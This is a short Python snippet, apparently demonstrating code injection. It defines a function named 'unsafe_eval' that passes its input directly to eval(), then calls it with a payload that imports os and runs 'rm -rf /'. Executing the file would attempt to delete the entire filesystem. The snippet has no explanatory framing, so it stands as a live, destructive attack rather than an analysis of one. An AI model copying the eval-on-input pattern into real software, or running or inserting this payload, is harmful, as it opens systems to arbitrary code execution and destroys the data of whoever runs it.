def unsafe_eval(user_input):
    result = eval(user_input)
    return result

unsafe_eval("__import__('os').system('rm -rf /')")
